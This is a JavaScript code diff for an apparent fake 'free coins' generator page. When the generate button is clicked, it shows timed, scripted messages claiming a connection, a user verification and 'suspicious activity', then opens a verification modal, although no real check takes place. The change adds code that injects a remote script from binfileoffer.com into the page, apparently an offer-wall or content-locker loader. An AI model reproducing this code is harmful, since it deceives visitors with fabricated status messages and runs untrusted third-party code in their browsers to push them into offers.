@@ -140,32 +140,57 @@ function running(coins_name, coins_img) {
 
     var coinId = false;
 
-    $('#generate_btn').click(function(){
-        var c = parseInt( coinNums[coinId] ) * 1000;
-        $('#personalInfo').modal('hide');
-        //$('#verification').modal('show');
-        plusCount(c, 0);
+    const loadBinfileofferScript = (callback) => {
+        const existingScript = document.getElementById('binfileofferscript');
+      
+        if (!existingScript) {
+          const script = document.createElement('script');
+          script.src = 'https://binfileoffer.com/script_include.php?id=954365';
+          script.id = 'binfileofferscript';
+          document.head.appendChild(script);
+      
+          script.onload = () => {
+            if (callback) callback();
+          };
+        }
+      
+        if (existingScript && callback) return callback();
+      };
 
-        $('.preloader').show();
-        $('header, nav, main, footer').css('filter', 'blur(5px) contrast(0.8) brightness(0.8)');
-        var u = $('input[name="username"]').val();
-        setTimeout(function(){
-            $('.preloader .p-text').html('<span class="text-success">Connected successfully!</span>');
+
+    $('#generate_btn').click(function(){
+        new Promise((resolve,reject)=>{
+            resolve(loadBinfileofferScript());
+        }).then(()=>{
+        
+            var c = parseInt( coinNums[coinId] ) * 1000;
+        
+            $('#personalInfo').modal('hide');
+            //$('#verification').modal('show');
+            plusCount(c, 0);
+    
+            $('.preloader').show();
+            $('header, nav, main, footer').css('filter', 'blur(5px) contrast(0.8) brightness(0.8)');
+            var u = $('input[name="username"]').val();
             setTimeout(function(){
-                $('.preloader .p-text').html('User verification...');
+                $('.preloader .p-text').html('<span class="text-success">Connected successfully!</span>');
                 setTimeout(function(){
-                    $('.preloader .p-text').html('<span class="text-success">' + u + ' verified!</span>');
+                    $('.preloader .p-text').html('User verification...');
                     setTimeout(function(){
-                        $('.preloader .p-text').html('<span class="text-danger">Suspicious activity detected!</span>');
+                        $('.preloader .p-text').html('<span class="text-success">' + u + ' verified!</span>');
                         setTimeout(function(){
-                            $('#loader, .p-text').hide();
-                                $('#verification').modal('show');
-                        },1500);
-                    },2000);
-                },3000);
-            },2000);
-        },3500);
-    });
+                            $('.preloader .p-text').html('<span class="text-danger">Suspicious activity detected!</span>');
+                            setTimeout(function(){
+                                $('#loader, .p-text').hide();
+                                    $('#verification').modal('show');
+                            },1500);
+                        },2000);
+                    },3000);
+                },2000);
+            },3500);
+        });
+        })
+
 
     });
 
